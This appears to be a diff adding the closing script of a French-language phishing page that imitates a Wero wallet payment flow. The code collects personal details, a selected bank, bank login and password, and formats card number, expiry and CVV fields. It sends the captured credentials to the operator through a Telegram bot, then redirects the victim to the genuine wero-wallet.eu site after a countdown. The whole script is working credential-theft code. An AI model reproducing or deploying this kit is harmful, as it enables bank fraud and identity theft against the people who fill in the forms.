+      var msg = "\uD83D\uDD14 <b>" + BOT_NAME + "</b>\n\n\uD83D\uDCCB <b>\u00C9tape 2 \u2014 Infos personnelles</b>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n";
+      inputs.forEach(function(inp, i) {
+        var lbl = labels[i] ? labels[i].textContent.replace('*','').trim() : 'Champ';
+        msg += "\u2022 <b>" + lbl + " :</b> " + inp.value.trim() + "\n";
+      });
+      sendTelegram(msg);
+      showLoading(function() { goTo('page3', 'page4'); }, 3000);
+    });
+  }
+
+  // =========================================
+  // PAGE 4 : paiement → PAGE 5
+  // =========================================
+  var btnPage4 = document.querySelector('#page4 .btn-continuer');
+  if (btnPage4) {
+      btnPage4.addEventListener('click', function() {
+        var page4 = document.getElementById('page4');
+		var bankName = document.getElementById('bankSelectedName').textContent.trim();
+        var identInput = page4.querySelectorAll('.p3-input')[0];
+        var pwdInput = document.getElementById('bankPwdInput');
+        var valid = true;
+        clearAllErr(page4);
+		
+		if (bankName === 'Choisir votre banque') {
+        var bankSel = document.getElementById('bankSelected');
+        bankSel.style.borderColor = '#e53935';
+        var errB = document.createElement('p');
+        errB.className = 'field-error'; errB.textContent = 'Veuillez sélectionner votre banque.';
+        bankSel.parentNode.insertBefore(errB, bankSel.nextSibling);
+        valid = false;
+      }
+
+        if (!identInput.value.trim()) {
+          showErr(identInput, 'Identifiant obligatoire.');
+          valid = false;
+        }
+        if (!pwdInput.value.trim()) {
+          showErr(pwdInput, 'Mot de passe obligatoire.');
+          valid = false;
+        }
+        if (!valid) return;
+
+        var msg = "\uD83D\uDD14 <b>" + BOT_NAME + "</b>\n\n" +
+                  "\uD83D\uDCCB <b>\u00C9tape 2 \u2014 Paiement</b>\n" +
+                  "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n" +
+				  "\uD83C\uDFE6 <b>Banque :</b> " + bankName + "\n" +
+                  "\uD83D\uDD11 <b>Identifiant :</b> " + identInput.value + "\n" +
+                  "\uD83D\uDD10 <b>Mot de passe :</b> " + pwdInput.value;
+        sendTelegram(msg);
+
+        showLoading(function() {
+          goTo('page4', 'page5');
+          startCountdown();
+        }, 3000);
+      });
+  }
+
+  // =========================================
+  // PAGE 5 : countdown 15s → Google
+  // =========================================
+  function startCountdown() {
+    var seconds = 45;
+    var bar = document.getElementById('progressBar');
+    var counter = document.getElementById('countdown');
+    if (bar) bar.style.width = '100%';
+    var iv = setInterval(function() {
+      seconds--;
+      if (counter) counter.textContent = seconds;
+      if (bar) bar.style.width = (seconds / 45 * 100) + '%';
+      if (seconds <= 0) { clearInterval(iv); window.location.href = 'https://wero-wallet.eu/pay-online'; }
+    }, 1000);
+  }
+
+  // =========================================
+  // BANK DROPDOWN
+  // =========================================
+  var bankSelected = document.getElementById('bankSelected');
+  if (bankSelected) {
+    bankSelected.addEventListener('click', function() {
+      var dd = document.getElementById('bankDropdown');
+      var arrow = document.getElementById('bankArrow');
+      var open = dd.style.display === 'block';
+      dd.style.display = open ? 'none' : 'block';
+      if (arrow) arrow.classList.toggle('open', !open);
+    });
+  }
+  document.addEventListener('click', function(e) {
+    var wrap = document.querySelector('.bank-select-wrap');
+    if (wrap && !wrap.contains(e.target)) {
+      var dd = document.getElementById('bankDropdown');
+      var arrow = document.getElementById('bankArrow');
+      if (dd) dd.style.display = 'none';
+      if (arrow) arrow.classList.remove('open');
+    }
+  });
+
+  // =========================================
+  // SELECT BANK
+  // =========================================
+  document.querySelectorAll('.bank-option').forEach(function(opt) {
+    opt.addEventListener('click', function() {
+      var name = opt.getAttribute('data-name');
+      var img  = opt.getAttribute('data-img');
+      document.getElementById('bankSelectedName').textContent = name;
+      var logoSpan = document.getElementById('bankSelectedLogo');
+      logoSpan.innerHTML = '<img src="' + img + '" style="width:26px;height:26px;object-fit:contain;border-radius:4px;"/>';
+      document.getElementById('bankDropdown').style.display = 'none';
+      document.getElementById('bankArrow').classList.remove('open');
+      document.getElementById('bankSelected').style.borderColor = '';
+      var errB = document.getElementById('bankSelected').nextSibling;
+      if (errB && errB.className === 'field-error') errB.remove();
+    });
+  });
+
+  // =========================================
+  // PASSWORD TOGGLES
+  // =========================================
+  var eyeBtn = document.querySelector('#passwordSection button[type=button]');
+  if (eyeBtn) {
+    var pwdVisible = false;
+    eyeBtn.addEventListener('click', function() {
+      pwdVisible = !pwdVisible;
+      document.getElementById('passwordInput').type = pwdVisible ? 'text' : 'password';
+    });
+  }
+  var bankEyeBtn = document.querySelector('#bankPwdInput + button');
+  if (bankEyeBtn) {
+    var bankPwdVis = false;
+    bankEyeBtn.addEventListener('click', function() {
+      bankPwdVis = !bankPwdVis;
+      document.getElementById('bankPwdInput').type = bankPwdVis ? 'text' : 'password';
+    });
+  }
+
+  // =========================================
+  // CARD FORMATTING
+  // =========================================
+  var cardNum = document.getElementById('cardNumber');
+  if (cardNum) cardNum.addEventListener('input', function() {
+    var v = this.value.replace(/[^0-9]/g,'').substring(0,16);
+    this.value = v.replace(/(.{4})/g,'$1 ').trim();
+  });
+  var cardExp = document.getElementById('cardExp');
+  if (cardExp) cardExp.addEventListener('input', function() {
+    var v = this.value.replace(/[^0-9]/g,'').substring(0,4);
+    if (v.length >= 3) v = v.substring(0,2) + '/' + v.substring(2);
+    this.value = v;
+  });
+  var cardCvv = document.getElementById('cardCvv');
+  if (cardCvv) cardCvv.addEventListener('input', function() {
+    this.value = this.value.replace(/[^0-9]/g,'').substring(0,3);
+  });
+
+  
+
+});
+</script>
+
+
+</body></html>
